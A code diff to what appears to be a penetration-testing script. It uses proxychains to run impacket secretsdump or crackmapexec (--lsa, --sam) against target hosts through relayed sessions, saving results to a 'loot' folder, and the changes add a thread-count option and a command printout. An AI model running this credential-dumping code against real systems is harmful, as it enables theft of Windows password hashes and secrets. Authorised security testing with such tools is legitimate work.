@@ -63,6 +63,7 @@ def mt_execute(username, ip, method, secretsdump_path):
     if method == 'secretsdump':
         os.system('sudo proxychains python3 {} {}:\'\'@{} -no-pass -outputfile \'{}/loot/{}\''.format(secretsdump_path, username, ip, cwd, ip))
     elif method == 'crackmapexec':
+        print(('proxychains crackmapexec smb {} -u {} -p \'\' -d {} --lsa'.format(ip, username.split('/')[1], username.split('/')[0])))
         os.system('proxychains crackmapexec smb {} -u {} -p \'\' -d {} --lsa'.format(ip, username.split('/')[1], username.split('/')[0]))
         os.system('proxychains crackmapexec smb {} -u {} -p \'\' -d {} --sam'.format(ip, username.split('/')[1], username.split('/')[0]))
 
@@ -80,10 +81,7 @@ if __name__ == '__main__':
     parser = argparse.ArgumentParser(add_help=True)
     parser.add_argument('-method', action='store', choices=['crackmapexec', 'secretsdump'], default='crackmapexec', help='Method used to dump LSA Secrets and SAM Default=crackmapexec')
     parser.add_argument('-sdp', action='store', help='Path to secretsdump.py file (only used if -method is secretsdump) Example -sdp /opt/impacket/examples/secretsdump.py')
-
-    if len(sys.argv) == 1:
-        parser.print_help()
-        sys.exit(1)
+    parser.add_argument('-threads', action='store', type=int, default=1, help='Number of threads to use Default=1 I recommend useing 1 as ntlmrelayx will sometimes lose a relay if you use more than 1 idk why')
 
     options = parser.parse_args()
 
@@ -131,7 +129,7 @@ if __name__ == '__main__':
             if os.path.isdir("{}/loot".format(cwd)) == False:
                 os.makedirs("{}/loot".format(cwd))
 
-            with concurrent.futures.ProcessPoolExecutor(max_workers=5) as executor:  # multithreading yeahhhh
+            with concurrent.futures.ProcessPoolExecutor(max_workers=options.threads) as executor:  # multithreading yeahhhh
                 for item in tmp:
                     dat = item.replace(']', '').split(',')
                     if dat[3] == 'TRUE':
